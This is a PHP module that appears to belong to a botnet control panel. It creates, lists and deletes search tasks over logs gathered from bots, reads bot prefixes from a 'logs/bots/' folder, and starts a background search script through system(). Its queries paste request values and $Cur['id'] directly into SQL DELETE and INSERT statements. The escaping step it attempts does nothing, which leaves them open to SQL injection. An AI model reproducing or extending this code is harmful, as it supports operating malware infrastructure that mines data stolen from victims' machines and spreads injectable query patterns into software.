<?php

if(file_exists('cache/run.pid')){
	$smarty->assign("run_pid", true);
}

if($Cur['type'] == 1){
	$dir = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir_site = realpath($dir . '/../../');
	system('cd ' . $dir_site . '/crons/; ./search_run.php &> /dev/null &');
}

if(!empty($Cur['id'])){
	$mysqli->query("delete from bf_search_task WHERE (id='".$Cur['id']."')");
	$mysqli->query("delete from bf_search_result WHERE (sid='".$Cur['id']."')");
}

if(isset($_POST['add'])){
	@array_walk($_POST, 'real_escape_string');

	if(!empty($_POST['text'])){

		if($_POST['data'] != '*'){
			if(($_POST['data'][0] . $_POST['data'][1] . $_POST['data'][2]) == ($_POST['data'][3] . $_POST['data'][4] . $_POST['data'][5])){
				$_POST['data'] = $_POST['data'][0] . '.' . $_POST['data'][1] . '.' . $_POST['data'][2];
			}else{
				$_POST['data'] = $_POST['data'][0] . '.' . $_POST['data'][1] . '.' . $_POST['data'][2] . '-' . $_POST['data'][3] . '.' . $_POST['data'][4] . '.' . $_POST['data'][5];
			}
		}

		$mysqli->query("INSERT INTO bf_search_task (searched, prefix, date, sparam) VALUES ('".$_POST['text']."', '".$_POST['prefix']."', '".$_POST['data']."', '".$_POST['type']."')");
	}
}

if(empty($_SESSION['user']->config['prefix'])){
	$prefix = scandir('logs/bots/', false);
	unset($prefix[0], $prefix[1]);
}else{
	$prefix[0] = $_SESSION['user']->config['prefix'];
}

$smarty->assign("prefix", $prefix);
$smarty->assign("list", $mysqli->query('SELECT * FROM bf_search_task ORDER by id DESC', null, null, false));

?>